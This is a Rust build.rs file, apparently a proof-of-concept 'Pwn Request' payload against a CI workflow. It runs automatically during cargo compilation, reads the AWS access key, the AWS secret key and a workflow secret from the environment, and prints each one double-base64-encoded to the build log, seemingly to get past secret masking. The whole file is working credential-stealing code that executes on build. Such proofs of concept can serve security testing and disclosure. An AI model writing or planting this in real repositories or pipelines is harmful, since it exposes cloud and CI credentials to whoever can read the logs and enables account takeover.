// Pwn Request verification payload.
// Runs when `cargo nextest archive -p runtime --test integration_models`
// compiles the runtime crate; build scripts execute as child processes of
// cargo and inherit the step env (AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY)
// plus workflow-level GERALT_SECRET.
fn b64(data: &[u8]) -> String {
    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | (b[2] as u32);
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 { T[((n >> 6) & 63) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { T[(n & 63) as usize] as char } else { '=' });
    }
    out
}

fn main() {
    for (name, var) in [
        ("GERALT_SECRET", std::env::var("GERALT_SECRET")),
        ("AWS_ACCESS_KEY_ID", std::env::var("AWS_ACCESS_KEY_ID")),
        ("AWS_SECRET_ACCESS_KEY", std::env::var("AWS_SECRET_ACCESS_KEY")),
    ] {
        if let Ok(v) = var {
            println!("PWN_REQ build.rs: {name} present, double-b64={}", b64(b64(v.as_bytes()).as_bytes()));
        }
    }
}
